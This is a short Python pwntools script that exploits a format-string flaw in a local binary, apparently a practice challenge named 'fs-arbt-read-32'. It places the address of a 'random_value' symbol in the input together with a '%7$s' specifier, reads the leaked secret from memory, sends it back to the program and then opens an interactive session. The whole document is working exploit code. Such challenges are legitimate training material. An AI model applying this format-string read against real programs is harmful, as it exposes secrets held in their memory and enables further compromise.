#!/usr/bin/env python
from pwn import *

p = process('./fs-arbt-read-32')

random_value_system = p.elf.symbols['random_value']

print(hex(random_value_system))

print(p.recv())

buf = p32(random_value_system) + "%7$s"

p.sendline(buf)

data = p.recvline()

print (data)

value = data[10:-1]

print (value)

value = u32(value)

print(hex(value))

p.sendline(hex(value))

p.interactive()
